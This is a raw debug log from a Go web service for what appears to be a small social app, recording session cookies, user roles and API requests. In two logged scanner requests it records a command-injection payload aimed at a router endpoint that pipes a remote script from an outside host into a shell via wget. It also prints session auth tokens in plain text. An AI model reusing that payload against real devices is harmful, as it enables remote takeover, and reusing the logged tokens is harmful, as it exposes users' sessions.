go build -o service_auth cmd/main.go
./service_auth --port="8080"
2024/10/23 14:08:00 Cookie: Name=role, Value=0
2024/10/23 14:08:00 Cookie: Name=auth, Value=MTcyOTY4MTEzM3xEWDhFQVFMX2dBQUJFQUVRQUFCWF80QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFFQVA0QkRnWnpkSEpwYm1jTUJnQUVjbTlzWlFOcGJuUUVBZ0FBfOcPZ9343UC_QVZrxXoIj5mNY45k-zSTxCvOxL5jiEBu
2024/10/23 14:08:00 Watched: 20
2024/10/23 14:08:00 Cookie: Name=watched, Value=20
2024/10/23 14:08:00 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/135/135
2024/10/23 14:08:00 "GET http://45.156.21.196:8080/api/get/user/135 HTTP/1.1" from 45.156.21.196:60120 - 200 981B in 3.224037ms
2024/10/23 14:11:26 ZZZZ
2024/10/23 14:11:26 userID: 135
2024/10/23 14:11:26 privileges: 0
2024/10/23 14:11:26 Image upload started
2024/10/23 14:11:26 Z1
2024/10/23 14:11:26 Z2
2024/10/23 14:11:26 Z3
2024/10/23 14:11:26 Z4
2024/10/23 14:11:26 Z5
2024/10/23 14:11:27 Z6
2024/10/23 14:11:27 "POST http://45.156.21.196:8080/api/create/post HTTP/1.1" from 45.156.21.196:33654 - 200 42B in 416.186409ms
2024/10/23 14:11:28 Unstrict
2024/10/23 14:11:28 Cookie: Name=userID, Value=135
2024/10/23 14:11:28 Cookie: Name=role, Value=0
2024/10/23 14:11:28 Cookie: Name=auth, Value=MTcyOTY4MTEzM3xEWDhFQVFMX2dBQUJFQUVRQUFCWF80QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFFQVA0QkRnWnpkSEpwYm1jTUJnQUVjbTlzWlFOcGJuUUVBZ0FBfOcPZ9343UC_QVZrxXoIj5mNY45k-zSTxCvOxL5jiEBu
2024/10/23 14:11:28 Watched: 20
2024/10/23 14:11:28 Cookie: Name=watched, Value=20
2024/10/23 14:11:28 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/135/135
2024/10/23 14:11:28 "GET http://45.156.21.196:8080/api/get/user/135 HTTP/1.1" from 45.156.21.196:33654 - 200 981B in 3.739099ms
2024/10/23 14:11:28 Z1
2024/10/23 14:11:28 "GET http://45.156.21.196:8080/api/get/posts_of/135/100 HTTP/1.1" from 45.156.21.196:33654 - 200 1023B in 3.697125ms
2024/10/23 14:11:30 Unstrict
2024/10/23 14:11:30 Cookie: Name=userID, Value=135
2024/10/23 14:11:30 Cookie: Name=role, Value=0
2024/10/23 14:11:30 Cookie: Name=auth, Value=MTcyOTY4MTEzM3xEWDhFQVFMX2dBQUJFQUVRQUFCWF80QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFFQVA0QkRnWnpkSEpwYm1jTUJnQUVjbTlzWlFOcGJuUUVBZ0FBfOcPZ9343UC_QVZrxXoIj5mNY45k-zSTxCvOxL5jiEBu
2024/10/23 14:11:30 Watched: 20
2024/10/23 14:11:30 Cookie: Name=watched, Value=20
2024/10/23 14:11:30 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/135/135
2024/10/23 14:11:30 "GET http://45.156.21.196:8080/api/get/user/135 HTTP/1.1" from 45.156.21.196:33654 - 200 981B in 2.452076ms
2024/10/23 14:11:30 Z1
2024/10/23 14:11:30 "GET http://45.156.21.196:8080/api/get/posts_of/135/100 HTTP/1.1" from 45.156.21.196:33654 - 200 1023B in 3.702886ms
2024/10/23 14:11:55 "GET http://45.156.21.196:8080/api/get/comments/192 HTTP/1.1" from 45.156.21.196:50268 - 200 4B in 1.417352ms
2024/10/23 14:13:36 Unstrict
2024/10/23 14:13:36 Cookie: Name=userID, Value=135
2024/10/23 14:13:36 Cookie: Name=role, Value=0
2024/10/23 14:13:36 Cookie: Name=auth, Value=MTcyOTY4MTEzM3xEWDhFQVFMX2dBQUJFQUVRQUFCWF80QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFFQVA0QkRnWnpkSEpwYm1jTUJnQUVjbTlzWlFOcGJuUUVBZ0FBfOcPZ9343UC_QVZrxXoIj5mNY45k-zSTxCvOxL5jiEBu
2024/10/23 14:13:36 Watched: 20
2024/10/23 14:13:36 Cookie: Name=watched, Value=20
2024/10/23 14:13:36 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/135/135
2024/10/23 14:13:36 "GET http://45.156.21.196:8080/api/get/user/135 HTTP/1.1" from 45.156.21.196:49324 - 200 981B in 3.279858ms
2024/10/23 14:13:36 Z1
2024/10/23 14:13:36 "GET http://45.156.21.196:8080/api/get/posts_of/135/100 HTTP/1.1" from 45.156.21.196:49324 - 200 1023B in 3.851691ms
2024/10/23 14:15:32 Unstrict
2024/10/23 14:15:32 Cookie: Name=userID, Value=135
2024/10/23 14:15:32 Cookie: Name=role, Value=0
2024/10/23 14:15:32 Cookie: Name=auth, Value=MTcyOTY4MTEzM3xEWDhFQVFMX2dBQUJFQUVRQUFCWF80QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFFQVA0QkRnWnpkSEpwYm1jTUJnQUVjbTlzWlFOcGJuUUVBZ0FBfOcPZ9343UC_QVZrxXoIj5mNY45k-zSTxCvOxL5jiEBu
2024/10/23 14:15:32 Watched: 20
2024/10/23 14:15:32 Cookie: Name=watched, Value=20
2024/10/23 14:15:32 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/135/135
2024/10/23 14:15:32 "GET http://45.156.21.196:8080/api/get/user/135 HTTP/1.1" from 45.156.21.196:49324 - 200 981B in 3.859901ms
2024/10/23 14:15:33 Z1
2024/10/23 14:15:33 "GET http://45.156.21.196:8080/api/get/posts_of/135/100 HTTP/1.1" from 45.156.21.196:49324 - 200 1023B in 3.691483ms
2024/10/23 14:19:45 "GET http://127.0.0.1/ HTTP/1.0" from 114.32.230.81:54880 - 404 19B in 10.52µs
2024/10/23 14:27:38 "GET http://45.156.21.196:8080/robots.txt HTTP/1.1" from 45.156.21.196:32870 - 404 19B in 9.18µs
2024/10/23 14:27:39 Unstrict
2024/10/23 14:27:39 Trends gotten
2024/10/23 14:27:39 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:32870 - 200 22845B in 69.34908ms
2024/10/23 14:30:49 "GET http://45.156.21.196:8080/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" from 185.224.128.67:58350 - 404 19B in 20.589µs
2024/10/23 14:30:49 "GET http://45.156.21.196:8080/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" from 185.224.128.67:58366 - 404 19B in 7.27µs
2024/10/23 14:33:12 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 154.213.184.18:39996 - 404 19B in 15.182µs
2024/10/23 14:46:16 "CONNECT http://cloudflare.com:443cloudflare.com:443 HTTP/1.1" from 179.43.133.162:56786 - 404 19B in 32.136µs
2024/10/23 15:09:24 Unstrict
2024/10/23 15:09:24 Trends gotten
2024/10/23 15:09:24 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:45584 - 200 22833B in 66.276953ms
2024/10/23 15:09:38 Unstrict
2024/10/23 15:09:38 Watched: 20
2024/10/23 15:09:38 Cookie: Name=watched, Value=20
2024/10/23 15:09:38 Trends gotten
2024/10/23 15:09:38 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:59030 - 200 3030B in 13.261793ms
2024/10/23 15:09:38 Unstrict
2024/10/23 15:09:38 Watched: 40
2024/10/23 15:09:38 Cookie: Name=watched, Value=40
2024/10/23 15:09:38 Trends gotten
2024/10/23 15:09:38 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:59030 - 200 5B in 2.744063ms
2024/10/23 15:09:38 Unstrict
2024/10/23 15:09:38 Watched: 40
2024/10/23 15:09:38 Cookie: Name=watched, Value=40
2024/10/23 15:09:38 Trends gotten
2024/10/23 15:09:38 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:59030 - 200 5B in 2.680976ms
2024/10/23 15:16:20 Unstrict
2024/10/23 15:16:20 Trends gotten
2024/10/23 15:16:20 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:51456 - 200 22831B in 75.974868ms
2024/10/23 15:32:47 Unstrict
2024/10/23 15:32:47 Trends gotten
2024/10/23 15:32:47 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:38896 - 200 22831B in 71.826882ms
2024/10/23 15:38:06 Unstrict
2024/10/23 15:38:06 Trends gotten
2024/10/23 15:38:06 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:40534 - 200 22740B in 75.678401ms
2024/10/23 15:44:38 Unstrict
2024/10/23 15:44:38 Cookie: Name=role, Value=0
2024/10/23 15:44:38 Cookie: Name=role, Value=3
2024/10/23 15:44:38 Cookie: Name=userID, Value=110
2024/10/23 15:44:38 Cookie: Name=auth, Value=MTcyOTY3NTI5MHxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFEQVBfY0JuTjBjbWx1Wnd3R0FBUnliMnhsQTJsdWRBUUNBQVk9fDivsxNPDczL5nJr-ZbyXrZlQ-ip-vKMbp2fEexDGPdI
2024/10/23 15:44:38 Trends gotten
2024/10/23 15:44:38 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:60176 - 200 22833B in 70.886435ms
2024/10/23 15:44:43 NIG
2024/10/23 15:44:43 "DELETE http://45.156.21.196:8080/logout HTTP/1.1" from 45.156.21.196:60176 - 204 0B in 934.085µs
2024/10/23 15:45:16 http://45.156.21.196:8530/api_auth_aether_server_sso/login
2024/10/23 15:45:16 "POST http://45.156.21.196:8080/login HTTP/1.1" from 45.156.21.196:60176 - 200 0B in 69.14072ms
2024/10/23 15:45:17 Unstrict
2024/10/23 15:45:17 Cookie: Name=role, Value=0
2024/10/23 15:45:17 Cookie: Name=role, Value=3
2024/10/23 15:45:17 Cookie: Name=userID, Value=110
2024/10/23 15:45:17 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:45:17 Trends gotten
2024/10/23 15:45:17 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:60176 - 200 22822B in 197.293623ms
2024/10/23 15:45:58 Unstrict
2024/10/23 15:45:58 Cookie: Name=role, Value=0
2024/10/23 15:45:58 Cookie: Name=role, Value=3
2024/10/23 15:45:58 Cookie: Name=userID, Value=110
2024/10/23 15:45:58 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:45:58 Watched: 20
2024/10/23 15:45:58 Cookie: Name=watched, Value=20
2024/10/23 15:45:58 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/110/110
2024/10/23 15:45:58 "GET http://45.156.21.196:8080/api/get/user/110 HTTP/1.1" from 45.156.21.196:49270 - 200 976B in 58.547945ms
2024/10/23 15:45:58 Unstrict
2024/10/23 15:45:58 Cookie: Name=role, Value=0
2024/10/23 15:45:58 Cookie: Name=role, Value=3
2024/10/23 15:45:58 Cookie: Name=userID, Value=110
2024/10/23 15:45:58 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:45:58 Trends gotten
2024/10/23 15:45:58 Z1
2024/10/23 15:45:58 "GET http://45.156.21.196:8080/api/get/posts_of/110/100 HTTP/1.1" from 45.156.21.196:49278 - 200 1044B in 136.005145ms
2024/10/23 15:45:58 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:60176 - 200 22844B in 205.791018ms
2024/10/23 15:45:58 NIG
2024/10/23 15:45:59 "DELETE http://45.156.21.196:8080/logout HTTP/1.1" from 45.156.21.196:49278 - 204 0B in 25.022983ms
2024/10/23 15:46:31 Unstrict
2024/10/23 15:46:37 Unstrict
2024/10/23 15:46:38 Cookie: Name=role, Value=0
2024/10/23 15:46:39 Cookie: Name=role, Value=3
2024/10/23 15:46:41 Cookie: Name=userID, Value=110
2024/10/23 15:46:43 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:46:48 Trends gotten
2024/10/23 15:46:48 Cookie: Name=role, Value=0
2024/10/23 15:46:54 Cookie: Name=role, Value=3
2024/10/23 15:46:58 Cookie: Name=userID, Value=110
2024/10/23 15:47:03 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:47:07 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/110/110
2024/10/23 15:47:31 Unstrict
2024/10/23 15:47:31 Cookie: Name=role, Value=0
2024/10/23 15:47:31 Cookie: Name=role, Value=3
2024/10/23 15:47:31 Cookie: Name=userID, Value=110
2024/10/23 15:47:31 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:47:31 Trends gotten
2024/10/23 15:47:32 Unstrict
2024/10/23 15:47:33 Trends gotten
2024/10/23 15:47:34 "GET http://45.156.21.196:8080/api/get/user/110 HTTP/1.1" from 45.156.21.196:49278 - 200 976B in 1m7.645908813s
2024/10/23 15:47:35 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:49270 - 200 22738B in 5.232190997s
2024/10/23 15:47:35 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:60176 - 200 22738B in 1m10.376284521s
2024/10/23 15:47:35 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:47314 - 200 22739B in 3.570743245s
2024/10/23 15:48:03 "GET http://example.comhttp://example.com/ HTTP/1.1" from 178.215.238.112:36212 - 404 19B in 17.175µs
2024/10/23 15:48:03 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 178.215.238.112:36224 - 404 19B in 10.361µs
2024/10/23 15:48:04 "GET http://example.comhttp://example.com/ HTTP/1.1" from 178.215.238.112:36234 - 404 19B in 16.918µs
2024/10/23 15:48:04 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 178.215.238.112:36250 - 404 19B in 9.075µs
2024/10/23 15:48:04 Unstrict
2024/10/23 15:48:04 Cookie: Name=role, Value=0
2024/10/23 15:48:04 Cookie: Name=role, Value=3
2024/10/23 15:48:04 Cookie: Name=userID, Value=110
2024/10/23 15:48:04 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:48:04 Watched: 20
2024/10/23 15:48:04 Cookie: Name=watched, Value=20
2024/10/23 15:48:04 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/110/110
2024/10/23 15:48:04 "GET http://45.156.21.196:8080/api/get/user/110 HTTP/1.1" from 45.156.21.196:47314 - 200 976B in 37.419022ms
2024/10/23 15:48:04 Z1
2024/10/23 15:48:04 "GET http://45.156.21.196:8080/api/get/posts_of/110/100 HTTP/1.1" from 45.156.21.196:47314 - 200 1044B in 5.47041ms
2024/10/23 15:48:08 "GET http://45.156.21.196:8080/api/get/comments/191 HTTP/1.1" from 45.156.21.196:47314 - 200 4B in 2.689696ms
2024/10/23 15:48:19 Unstrict
2024/10/23 15:48:19 Cookie: Name=role, Value=0
2024/10/23 15:48:19 Cookie: Name=role, Value=3
2024/10/23 15:48:19 Cookie: Name=userID, Value=110
2024/10/23 15:48:19 Cookie: Name=auth, Value=MTcyOTY4NzUxNnxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01CZ0FFY205c1pRTnBiblFFQWdBR0JuTjBjbWx1Wnd3UEFBMWhkWFJvWlc1MGFXTmhkR1ZrQkdKdmIyd0NBZ0FCQm5OMGNtbHVad3dJQUFaMWMyVnlTVVFEYVc1MEJBTUFfOXc9fHKfCCGsM0MmcDkPibIJp6E5GARM-EfxbCIAvpcQlw51
2024/10/23 15:48:19 Trends gotten
2024/10/23 15:48:20 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:47314 - 200 22813B in 71.127892ms
2024/10/23 15:48:22 ZZZZ
2024/10/23 15:48:22 userID: 110
2024/10/23 15:48:22 privileges: 3
2024/10/23 15:48:22 Fetching subscriptions
2024/10/23 15:48:22 "GET http://45.156.21.196:8080/api/get/subscriptions HTTP/1.1" from 45.156.21.196:47314 - 404 28B in 33.51638ms
2024/10/23 15:49:44 http://45.156.21.196:8530/api_auth_aether_server_sso/login
2024/10/23 15:49:44 "POST http://45.156.21.196:8080/login HTTP/1.1" from 45.156.21.196:47314 - 200 0B in 4.032426ms
2024/10/23 15:49:44 Unstrict
2024/10/23 15:49:44 Cookie: Name=userID, Value=86
2024/10/23 15:49:44 Cookie: Name=role, Value=2
2024/10/23 15:49:44 Cookie: Name=auth, Value=MTcyOTY4Nzc4NHxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFEQVAtc0JuTjBjbWx1Wnd3R0FBUnliMnhsQTJsdWRBUUNBQVE9fMxsBEcGTe6-EDk--gJaiqdSN9Y0uFSsA7kt-1VoubqL
2024/10/23 15:49:44 Trends gotten
2024/10/23 15:49:44 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:47314 - 200 22842B in 82.942376ms
2024/10/23 15:49:48 Unstrict
2024/10/23 15:49:48 Cookie: Name=role, Value=0
2024/10/23 15:49:48 Trends gotten
2024/10/23 15:49:48 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:47314 - 200 22813B in 70.849431ms
2024/10/23 15:49:50 Unstrict
2024/10/23 15:49:50 Cookie: Name=userID, Value=86
2024/10/23 15:49:50 Cookie: Name=role, Value=2
2024/10/23 15:49:50 Cookie: Name=auth, Value=MTcyOTY4Nzc4NHxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFEQVAtc0JuTjBjbWx1Wnd3R0FBUnliMnhsQTJsdWRBUUNBQVE9fMxsBEcGTe6-EDk--gJaiqdSN9Y0uFSsA7kt-1VoubqL
2024/10/23 15:49:50 Watched: 20
2024/10/23 15:49:50 Cookie: Name=watched, Value=20
2024/10/23 15:49:50 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/86/86
2024/10/23 15:49:50 "GET http://45.156.21.196:8080/api/get/user/86 HTTP/1.1" from 45.156.21.196:52692 - 200 1150B in 2.673122ms
2024/10/23 15:49:50 Z1
2024/10/23 15:49:50 "GET http://45.156.21.196:8080/api/get/posts_of/86/100 HTTP/1.1" from 45.156.21.196:52692 - 200 2120B in 4.822233ms
2024/10/23 15:49:54 Unstrict
2024/10/23 15:49:54 Cookie: Name=userID, Value=86
2024/10/23 15:49:54 Cookie: Name=role, Value=2
2024/10/23 15:49:54 Cookie: Name=auth, Value=MTcyOTY4Nzc4NHxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFEQVAtc0JuTjBjbWx1Wnd3R0FBUnliMnhsQTJsdWRBUUNBQVE9fMxsBEcGTe6-EDk--gJaiqdSN9Y0uFSsA7kt-1VoubqL
2024/10/23 15:49:54 Trends gotten
2024/10/23 15:49:54 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:52692 - 200 22842B in 64.285272ms
2024/10/23 15:49:55 Unstrict
2024/10/23 15:49:55 Cookie: Name=userID, Value=86
2024/10/23 15:49:55 Cookie: Name=role, Value=2
2024/10/23 15:49:55 Cookie: Name=auth, Value=MTcyOTY4Nzc4NHxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFEQVAtc0JuTjBjbWx1Wnd3R0FBUnliMnhsQTJsdWRBUUNBQVE9fMxsBEcGTe6-EDk--gJaiqdSN9Y0uFSsA7kt-1VoubqL
2024/10/23 15:49:55 Watched: 20
2024/10/23 15:49:55 Cookie: Name=watched, Value=20
2024/10/23 15:49:55 Trends gotten
2024/10/23 15:49:55 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:52692 - 200 3049B in 13.639397ms
2024/10/23 15:50:01 "GET http://45.156.21.196:8080/api/get/comments/113 HTTP/1.1" from 45.156.21.196:52692 - 200 4B in 1.705585ms
2024/10/23 15:50:03 "GET http://45.156.21.196:8080/api/get/comments/113 HTTP/1.1" from 45.156.21.196:52692 - 200 4B in 1.197162ms
2024/10/23 15:50:06 ZZZZ
2024/10/23 15:50:06 userID: 86
2024/10/23 15:50:06 privileges: 2
2024/10/23 15:50:06 "DELETE http://45.156.21.196:8080/api/delete/sudo_post/113 HTTP/1.1" from 45.156.21.196:52692 - 200 40B in 7.455002ms
2024/10/23 15:50:07 "GET http://45.156.21.196:8080/api/get/comments/192 HTTP/1.1" from 45.156.21.196:47314 - 200 4B in 2.039274ms
2024/10/23 15:50:08 "GET http://45.156.21.196:8080/api/get/comments/113 HTTP/1.1" from 45.156.21.196:52692 - 200 4B in 1.819679ms
2024/10/23 15:50:09 ZZZZ
2024/10/23 15:50:09 userID: 86
2024/10/23 15:50:09 privileges: 2
2024/10/23 15:50:09 "DELETE http://45.156.21.196:8080/api/delete/sudo_post/113 HTTP/1.1" from 45.156.21.196:52692 - 500 49B in 2.695601ms
2024/10/23 15:50:11 "GET http://45.156.21.196:8080/api/get/comments/67 HTTP/1.1" from 45.156.21.196:52692 - 200 4B in 2.083461ms
2024/10/23 15:50:13 ZZZZ
2024/10/23 15:50:13 userID: 86
2024/10/23 15:50:13 privileges: 2
2024/10/23 15:50:13 "DELETE http://45.156.21.196:8080/api/delete/sudo_post/67 HTTP/1.1" from 45.156.21.196:52692 - 200 40B in 4.534224ms
2024/10/23 15:50:18 Unstrict
2024/10/23 15:50:18 Cookie: Name=userID, Value=86
2024/10/23 15:50:18 Cookie: Name=role, Value=2
2024/10/23 15:50:18 Cookie: Name=auth, Value=MTcyOTY4Nzc4NHxEWDhFQVFMX2dBQUJFQUVRQUFCV180QUFBd1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNBQUdkWE5sY2tsRUEybHVkQVFEQVAtc0JuTjBjbWx1Wnd3R0FBUnliMnhsQTJsdWRBUUNBQVE9fMxsBEcGTe6-EDk--gJaiqdSN9Y0uFSsA7kt-1VoubqL
2024/10/23 15:50:18 Watched: 40
2024/10/23 15:50:18 Cookie: Name=watched, Value=40
2024/10/23 15:50:18 Trends gotten
2024/10/23 15:50:18 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:52692 - 200 5B in 2.526266ms
2024/10/23 15:50:18 Unstrict
2024/10/23 15:50:18 Cookie: Name=userID, Value=86
2024/10/23 15:50:18 Cookie: Name=role, Value=2
